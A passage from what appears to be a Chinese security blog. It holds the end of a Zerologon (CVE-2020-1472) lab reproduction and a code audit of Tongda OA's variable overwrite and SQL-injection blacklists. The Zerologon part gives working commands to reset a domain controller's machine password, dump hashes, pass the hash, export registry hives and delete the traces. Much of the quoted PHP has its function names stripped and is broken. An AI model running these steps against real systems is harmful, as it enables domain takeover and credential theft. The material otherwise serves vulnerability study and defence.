CVE-2020-1472</span><br></pre></td></tr></table></figure><p>直接拿根域测，执行</p><p><code>python cve-2020-1472-exploit.py AD 10.100.100.100</code></p><p><img src="/images/image-20200929143732278.png" alt="image-20200929143732278"></p><p>此时已经把域控的机器账户<code>AD$</code>的密码重置为空<code>（机器账户=机器名$）</code></p><p>然后利用<code>impacket</code>的<code>secretsdump.py</code>读取<code>hash</code></p><p><code>python secretsdump.py 0x20h.com/AD$@10.100.100.100 -no-pass -just-dc</code></p><p><img src="/images/image-20200929143948145.png" alt="image-20200929143948145"></p><p>此时就可以利用抓到的<code>hash</code>扔进<code>wmiexec.py</code>执行命令了</p><p><code>python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:197b00243031b8c3fe0379ea55b6d509 0x20h.com/administrator@10.100.100.100</code></p><p><img src="/images/image-20200929144155959.png" alt="image-20200929144155959"></p><h2 id="恢复现场"><a href="#恢复现场" class="headerlink" title="恢复现场"></a>恢复现场</h2><p>拷贝DC中SAM数据库到攻击机中</p><blockquote><p>reg save HKLM\SYSTEM system.save<br>reg save HKLM\SAM sam.save<br>reg save HKLM\SECURITY security.save<br>执行完上面的命令后可能会报错，但是SAM等文件已经导出</p></blockquote><p><img src="/images/image-20200929144844874.png" alt="image-20200929144844874"></p><p><img src="/images/image-20200929144858367.png" alt="image-20200929144858367"><br>将文件拉回本地并删除远端的记录</p><blockquote><p>get system.save<br>get sam.save<br>get security.save<br>del &#x2F;f system.save<br>del &#x2F;f sam.save<br>del &#x2F;f security.save</p></blockquote><p><img src="/images/image-20200929145000901.png" alt="image-20200929145000901"></p><p>然后执行<code>secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</code>获取明文hex</p><p><img src="/images/image-20200929145055645.png" alt="image-20200929145055645"></p><p>恢复机器账户密码<code>python restorepassword.py AD@AD -target-ip 10.100.100.100 -hexpass 98ec4f29194948ac647217bd3e1daf4b7908e8c1 7aefe4084025672cd5cde13ade47748bb69ac95c2f4b0538b7a61a17a7a27b5ce108de5212656b73cb168cd1d58860573108e70aba41b345e478588795e07bbe13e25e0e76551ebb320acf12b46f6367e199857edc39ec790d8d6e0a01b847fae9549dc4ed7e961ca1678ca1fb5017efd5c716b506c7f37d44218e154921e6dde4dd5c74a4e9b2df5e017ba0e55224df6461f7508c03f8dd3067de61875ab896ddc44c1f5d3989ad8cf667bdc5457603fb79517ce6c428b1c82072c9285fa4fbabb4bd453b8e71c2233722807257761d8a8819ef72d3b4e2cdbfcda4</code></p><p><img src="/images/image-20200929145438223.png" alt="image-20200929145438223"></p><p>查看密码是否更改<code> python secretsdump.py 0x20h.com/administrator:&quot;域控密码&quot;@10.100.100.100 -just-dc-user AD$</code></p><p><img src="/images/image-20200929150024572.png" alt="image-20200929150024572"></p><h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>如果有环境为林域且与根域控网络互通，可以直接攻击根域控</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>审计通达OA时的一些记录</title>
      <link href="/p/9367.html"/>
      <url>/p/9367.html</url>
      
        <content type="html"><![CDATA[<p>学习审计通达OA时发现的一些有意思的事</p><span id="more"></span><h1 id="全局变量覆盖"><a href="#全局变量覆盖" class="headerlink" title="全局变量覆盖"></a>全局变量覆盖</h1><p>审计时发现前辈们提到了这个问题，跟了下存在问题的文件</p><p>比如存在变量覆盖的文件是<code>pda\vote\list.php</code>，</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;pda/auth.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;inc/conn.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;inc/utility_all.php&quot;</span>;</span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;mobile/api/qyapp.vote.class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$P</span> == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line"><span class="variable">$P</span> = <span class="variable">$_COOKIE</span>[<span class="string">&quot;PHPSESSID&quot;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$P</span> = <span class="variable">$_GET</span>[<span class="string">&quot;P&quot;</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里包含了<code>inc/conn.php</code>数据库连接文件</p><p><img src="/images/image-20200723103126920.png" alt="image-20200723103126920"></p><p>继续跟，发现包含了<code>inc/td_config.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;inc/common.inc.php&quot;</span>;</span><br><span class="line"><span class="variable">$ROOT_PATH</span> = (<span class="variable">$_SERVER</span>[<span class="string">&quot;DOCUMENT_ROOT&quot;</span>] ? <span class="variable">$_SERVER</span>[<span class="string">&quot;DOCUMENT_ROOT&quot;</span>] : <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$ROOT_PATH</span> == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line"><span class="variable">$ROOT_PATH</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\\&quot;</span>, <span class="string">&quot;/&quot;</span>, <span class="title function_ invoke__">realpath</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&quot;/../&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$ROOT_PATH</span>, -<span class="number">1</span>) != <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line"><span class="variable">$ROOT_PATH</span> .= <span class="string">&quot;/&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>包含了<code>inc/common.inc.php</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//......代码省略</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$_COOKIE</span>)) &#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_COOKIE</span> <span class="keyword">as</span> <span class="variable">$s_key</span> =&gt; <span class="variable">$s_value</span> ) &#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="title function_ invoke__">substr</span>(<span class="variable">$s_key</span>, <span class="number">0</span>, <span class="number">7</span>) == <span class="string">&quot;_SERVER&quot;</span>) || (<span class="title function_ invoke__">substr</span>(<span class="variable">$s_key</span>, <span class="number">0</span>, <span class="number">8</span>) == <span class="string">&quot;_SESSION&quot;</span>) || (<span class="title function_ invoke__">substr</span>(<span class="variable">$s_key</span>, <span class="number">0</span>, <span class="number">7</span>) == <span class="string">&quot;_COOKIE&quot;</span>) || (<span class="title function_ invoke__">substr</span>(<span class="variable">$s_key</span>, <span class="number">0</span>, <span class="number">4</span>) == <span class="string">&quot;_GET&quot;</span>) || (<span class="title function_ invoke__">substr</span>(<span class="variable">$s_key</span>, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">&quot;_POST&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$s_value</span>)) &#123;</span><br><span class="line"><span class="variable">$_COOKIE</span>[<span class="variable">$s_key</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="title function_ invoke__">strip_tags</span>(<span class="variable">$s_value</span>));<span class="comment">//&lt;---</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s_key</span> = <span class="variable">$_COOKIE</span>[<span class="variable">$s_key</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">reset</span>(<span class="variable">$_COOKIE</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$_POST</span>)) &#123;</span><br><span class="line"><span class="variable">$arr_html_fields</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$s_key</span> =&gt; <span class="variable">$s_value</span> ) &#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="title function_ invoke__">substr</span>(<span class="variable">$s_key</span>, <span class="number">0</span>, <span class="number">7</span>) == <span class="string">&quot;_SERVER&quot;</span>) || (<span class="title function_ invoke__">substr</span>(<span class="variable">$s_key</span>, <span class="number">0</span>, <span class="number">8</span>) == <span class="string">&quot;_SESSION&quot;</span>) || (<span class="title function_ invoke__">substr</span>(<span class="variable">$s_key</span>, <span class="number">0</span>, <span class="number">7</span>) == <span class="string">&quot;_COOKIE&quot;</span>) || (<span class="title function_ invoke__">substr</span>(<span class="variable">$s_key</span>, <span class="number">0</span>, <span class="number">4</span>) == <span class="string">&quot;_GET&quot;</span>) || (<span class="title function_ invoke__">substr</span>(<span class="variable">$s_key</span>, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">&quot;_POST&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$s_key</span>, <span class="number">0</span>, <span class="number">15</span>) != <span class="string">&quot;TD_HTML_EDITOR_&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$s_value</span>)) &#123;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="variable">$s_key</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="title function_ invoke__">strip_tags</span>(<span class="variable">$s_value</span>));<span class="comment">//&lt;---</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s_key</span> = <span class="variable">$_POST</span>[<span class="variable">$s_key</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="variable">$s_key</span> == <span class="string">&quot;TD_HTML_EDITOR_FORM_HTML_DATA&quot;</span>) || (<span class="variable">$s_key</span> == <span class="string">&quot;TD_HTML_EDITOR_PRCS_IN&quot;</span>) || (<span class="variable">$s_key</span> == <span class="string">&quot;TD_HTML_EDITOR_PRCS_OUT&quot;</span>) || (<span class="variable">$s_key</span> == <span class="string">&quot;TD_HTML_EDITOR_QTPL_PRCS_SET&quot;</span>) || (<span class="variable">$_POST</span>[<span class="string">&quot;ACTION_TYPE&quot;</span>] &amp;&amp; ((<span class="variable">$_POST</span>[<span class="string">&quot;ACTION_TYPE&quot;</span>] == <span class="string">&quot;approve_center&quot;</span>) || (<span class="variable">$_POST</span>[<span class="string">&quot;ACTION_TYPE&quot;</span>] == <span class="string">&quot;workflow&quot;</span>) || (<span class="variable">$_POST</span>[<span class="string">&quot;ACTION_TYPE&quot;</span>] == <span class="string">&quot;sms&quot;</span>) || (<span class="variable">$_POST</span>[<span class="string">&quot;ACTION_TYPE&quot;</span>] == <span class="string">&quot;wiki&quot;</span>)) &amp;&amp; ((<span class="variable">$s_key</span> == <span class="string">&quot;CONTENT&quot;</span>) || (<span class="variable">$s_key</span> == <span class="string">&quot;TD_HTML_EDITOR_CONTENT&quot;</span>) || (<span class="variable">$s_key</span> == <span class="string">&quot;TD_HTML_EDITOR_TPT_CONTENT&quot;</span>)))) &#123;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="variable">$s_key</span>]);</span><br><span class="line"><span class="variable">$s_key</span> = (<span class="variable">$s_key</span> == <span class="string">&quot;CONTENT&quot;</span> ? <span class="variable">$s_key</span> : <span class="title function_ invoke__">substr</span>(<span class="variable">$s_key</span>, <span class="number">15</span>));</span><br><span class="line"><span class="variable">$s_key</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$s_value</span>);</span><br><span class="line"><span class="variable">$arr_html_fields</span>[<span class="variable">$s_key</span>] = <span class="variable">$s_key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$encoding</span> = <span class="title function_ invoke__">mb_detect_encoding</span>(<span class="variable">$s_value</span>, <span class="string">&quot;GBK,UTF-8&quot;</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$_POST</span>[<span class="variable">$s_key</span>]);</span><br><span class="line"><span class="variable">$s_key</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$s_key</span>, <span class="number">15</span>);</span><br><span class="line"><span class="variable">$s_key</span> = <span class="title function_ invoke__">addslashes</span>(<span class="title function_ invoke__">rich_text_clean</span>(<span class="variable">$s_value</span>, <span class="variable">$encoding</span>));</span><br><span class="line"><span class="variable">$arr_html_fields</span>[<span class="variable">$s_key</span>] = <span class="variable">$s_key</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">reset</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$_POST</span> = <span class="title function_ invoke__">array_merge</span>(<span class="variable">$_POST</span>, <span class="variable">$arr_html_fields</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="number">0</span> &lt; <span class="title function_ invoke__">count</span>(<span class="variable">$_GET</span>)) &#123;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$s_key</span> =&gt; <span class="variable">$s_value</span> ) &#123;</span><br><span class="line"><span class="keyword">if</span> ((<span class="title function_ invoke__">substr</span>(<span class="variable">$s_key</span>, <span class="number">0</span>, <span class="number">7</span>) == <span class="string">&quot;_SERVER&quot;</span>) || (<span class="title function_ invoke__">substr</span>(<span class="variable">$s_key</span>, <span class="number">0</span>, <span class="number">8</span>) == <span class="string">&quot;_SESSION&quot;</span>) || (<span class="title function_ invoke__">substr</span>(<span class="variable">$s_key</span>, <span class="number">0</span>, <span class="number">7</span>) == <span class="string">&quot;_COOKIE&quot;</span>) || (<span class="title function_ invoke__">substr</span>(<span class="variable">$s_key</span>, <span class="number">0</span>, <span class="number">4</span>) == <span class="string">&quot;_GET&quot;</span>) || (<span class="title function_ invoke__">substr</span>(<span class="variable">$s_key</span>, <span class="number">0</span>, <span class="number">5</span>) == <span class="string">&quot;_POST&quot;</span>)) &#123;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_array</span>(<span class="variable">$s_value</span>)) &#123;</span><br><span class="line"><span class="variable">$_GET</span>[<span class="variable">$s_key</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="title function_ invoke__">strip_tags</span>(<span class="variable">$s_value</span>));<span class="comment">//&lt;---</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s_key</span> = <span class="variable">$_GET</span>[<span class="variable">$s_key</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">reset</span>(<span class="variable">$_GET</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$s_key</span>);</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$s_value</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>只要包含了这个文件，就会存在该问题</p><h1 id="注入过滤规则"><a href="#注入过滤规则" class="headerlink" title="注入过滤规则"></a>注入过滤规则</h1><p>笔者对比了2013~2019（V11）的过滤SQL注入的代码，高版本的防注代码在<code>inc\conn.php</code>的<code>sql_injection</code>函数，低版本的在<code>exequery</code>处理，都是基于黑名单模式进行防注处理，80sec的软waf</p><h2 id="2013-exequery"><a href="#2013-exequery" class="headerlink" title="2013-exequery"></a>2013-exequery</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">exequery</span>(<span class="params"> <span class="variable">$C</span>, <span class="variable">$Q</span>, <span class="variable">$LOG</span> = <span class="literal">FALSE</span> </span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="variable">$LOG</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$POS</span> = ( <span class="variable">$Q</span>, <span class="string">&quot;union&quot;</span> );</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$POS</span> !== <span class="literal">FALSE</span> &amp;&amp; ( <span class="variable">$Q</span>, <span class="string">&quot;select&quot;</span>, <span class="variable">$POS</span> ) !== <span class="literal">FALSE</span> )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>( );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$POS</span> = ( <span class="variable">$Q</span>, <span class="string">&quot;into&quot;</span> );</span><br><span class="line">        <span class="keyword">if</span> ( <span class="variable">$POS</span> !== <span class="literal">FALSE</span> &amp;&amp; ( ( <span class="variable">$Q</span>, <span class="string">&quot;outfile&quot;</span>, <span class="variable">$POS</span> ) !== <span class="literal">FALSE</span> || ( <span class="variable">$Q</span>, <span class="string">&quot;dumpfile&quot;</span>, <span class="variable">$POS</span> ) !== <span class="literal">FALSE</span> ) )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">exit</span>( );</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( ( <span class="variable">$C</span> ) )</span><br><span class="line">    &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !( <span class="variable">$C</span> ) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( ( <span class="variable">$C</span> ) )</span><br><span class="line">        &#123;</span><br><span class="line">            ( <span class="variable">$C</span> );</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$C</span> = ( <span class="variable">$C</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !( <span class="variable">$C</span> ) )</span><br><span class="line">    &#123;</span><br><span class="line">        ( ( <span class="string">&quot;无效的数据库连接&quot;</span> ).<span class="string">&quot;&lt;br&gt;&lt;b&gt;&quot;</span>.( <span class="string">&quot;SQL语句:&quot;</span> ).<span class="string">&quot;&lt;/b&gt; &quot;</span>.<span class="variable">$Q</span>, <span class="variable">$LOG</span> );</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$cursor</span> = @( <span class="variable">$Q</span>, <span class="variable">$C</span> );</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="variable">$cursor</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        ( <span class="string">&quot;&lt;b&gt;&quot;</span>.( <span class="string">&quot;SQL语句:&quot;</span> ).<span class="string">&quot;&lt;/b&gt; &quot;</span>.<span class="variable">$Q</span>, <span class="variable">$LOG</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$cursor</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到早年的通达仅仅检测了<code>union</code>、<code>select</code>、<code>into</code>、<code>outfile</code>、<code>dumpfile</code>这几个关键字，导致可绕过的方式很多，比如常用于盲注的<code>sleep</code>等</p><h2 id="2013adv-sql-injection"><a href="#2013adv-sql-injection" class="headerlink" title="2013adv-sql_injection"></a>2013adv-sql_injection</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sql_injection</span>(<span class="params"> <span class="variable">$db_string</span> </span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$clean</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$error</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$old_pos</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="variable">$pos</span> = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$pos</span> = ( <span class="variable">$db_string</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="variable">$pos</span> + <span class="number">1</span> );</span><br><span class="line">        <span class="variable">$clean</span> .= ( <span class="variable">$db_string</span>, <span class="variable">$old_pos</span>, <span class="variable">$pos</span> - <span class="variable">$old_pos</span> );</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="variable">$pos1</span> = ( <span class="variable">$db_string</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="variable">$pos</span> + <span class="number">1</span> );</span><br><span class="line">            <span class="variable">$pos2</span> = ( <span class="variable">$db_string</span>, <span class="string">&quot;\\&quot;</span>, <span class="variable">$pos</span> + <span class="number">1</span> );</span><br><span class="line">            <span class="keyword">if</span> ( !<span class="variable">$pos2</span> &amp;&amp; <span class="variable">$pos1</span> &lt; <span class="variable">$pos2</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$pos</span> = <span class="variable">$pos1</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$pos</span> = <span class="variable">$pos2</span> + <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">while</span> ( <span class="number">1</span> );</span><br><span class="line">        <span class="variable">$clean</span> .= <span class="string">&quot;\$s\$&quot;</span>;</span><br><span class="line">        <span class="variable">$old_pos</span> = <span class="variable">$pos</span> + <span class="number">1</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> ( <span class="number">1</span> );</span><br><span class="line">    <span class="variable">$clean</span> .= ( <span class="variable">$db_string</span>, <span class="variable">$old_pos</span> );</span><br><span class="line">    <span class="variable">$clean</span> = ( ( ( <span class="keyword">array</span>( <span class="string">&quot;~\\s+~s&quot;</span> ), <span class="keyword">array</span>( <span class="string">&quot; &quot;</span> ), <span class="variable">$clean</span> ) ) );</span><br><span class="line">    <span class="variable">$fail</span> = <span class="literal">FALSE</span>;</span><br><span class="line">    <span class="keyword">if</span> ( ( <span class="variable">$clean</span>, <span class="string">&quot;union&quot;</span> ) !== <span class="literal">FALSE</span> &amp;&amp; ( <span class="string">&quot;~(^|[^a-z])union(\$|[^[a-z])~s&quot;</span>, <span class="variable">$clean</span> ) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="variable">$error</span> = ( <span class="string">&quot;联合查询&quot;</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="number">2</span> &lt; ( <span class="variable">$clean</span>, <span class="string">&quot;/*&quot;</span> ) || ( <span class="variable">$clean</span>, <span class="string">&quot;--&quot;</span> ) !== <span class="literal">FALSE</span> || ( <span class="variable">$clean</span>, <span class="string">&quot;#&quot;</span> ) !== <span class="literal">FALSE</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="variable">$error</span> = ( <span class="string">&quot;注释代码&quot;</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ( <span class="variable">$clean</span>, <span class="string">&quot;sleep&quot;</span> ) !== <span class="literal">FALSE</span> &amp;&amp; ( <span class="string">&quot;~(^|[^a-z])sleep(\$|[^[a-z])~s&quot;</span>, <span class="variable">$clean</span> ) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&quot;sleep&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ( <span class="variable">$clean</span>, <span class="string">&quot;benchmark&quot;</span> ) !== <span class="literal">FALSE</span> &amp;&amp; ( <span class="string">&quot;~(^|[^a-z])benchmark(\$|[^[a-z])~s&quot;</span>, <span class="variable">$clean</span> ) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&quot;benchmark&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ( <span class="variable">$clean</span>, <span class="string">&quot;load_file&quot;</span> ) !== <span class="literal">FALSE</span> &amp;&amp; ( <span class="string">&quot;~(^|[^a-z])load_file(\$|[^[a-z])~s&quot;</span>, <span class="variable">$clean</span> ) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="variable">$error</span> = ( <span class="string">&quot;Load文件&quot;</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ( <span class="variable">$clean</span>, <span class="string">&quot;cast&quot;</span> ) !== <span class="literal">FALSE</span> &amp;&amp; ( <span class="string">&quot;~(^|[^a-z])mid(\$|[^[a-z])~s&quot;</span>, <span class="variable">$clean</span> ) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&quot;cast&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ( <span class="variable">$clean</span>, <span class="string">&quot;ord&quot;</span> ) !== <span class="literal">FALSE</span> &amp;&amp; ( <span class="string">&quot;~(^|[^a-z])ord(\$|[^[a-z])~s&quot;</span>, <span class="variable">$clean</span> ) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&quot;ord&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ( <span class="variable">$clean</span>, <span class="string">&quot;ascii&quot;</span> ) !== <span class="literal">FALSE</span> &amp;&amp; ( <span class="string">&quot;~(^|[^a-z])ascii(\$|[^[a-z])~s&quot;</span>, <span class="variable">$clean</span> ) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&quot;ascii&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ( <span class="variable">$clean</span>, <span class="string">&quot;extractvalue&quot;</span> ) !== <span class="literal">FALSE</span> &amp;&amp; ( <span class="string">&quot;~(^|[^a-z])extractvalue(\$|[^[a-z])~s&quot;</span>, <span class="variable">$clean</span> ) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&quot;extractvalue&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ( <span class="variable">$clean</span>, <span class="string">&quot;updatexml&quot;</span> ) !== <span class="literal">FALSE</span> &amp;&amp; ( <span class="string">&quot;~(^|[^a-z])updatexml(\$|[^[a-z])~s&quot;</span>, <span class="variable">$clean</span> ) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="variable">$error</span> = <span class="string">&quot;updatexml&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( ( <span class="variable">$clean</span>, <span class="string">&quot;into outfile&quot;</span> ) !== <span class="literal">FALSE</span> &amp;&amp; ( <span class="string">&quot;~(^|[^a-z])into\\s+outfile(\$|[^[a-z])~s&quot;</span>, <span class="variable">$clean</span> ) != <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$fail</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        <span class="variable">$error</span> = ( <span class="string">&quot;生成文件&quot;</span> );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="variable">$fail</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> ( <span class="string">&quot;不安全的SQL语句：&quot;</span> ).<span class="variable">$error</span>.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> ( <span class="variable">$db_string</span> );</span><br><span class="line">        <span class="keyword">exit</span>( );</span><br><span class="line">    &#125;</span><br><span class="line">    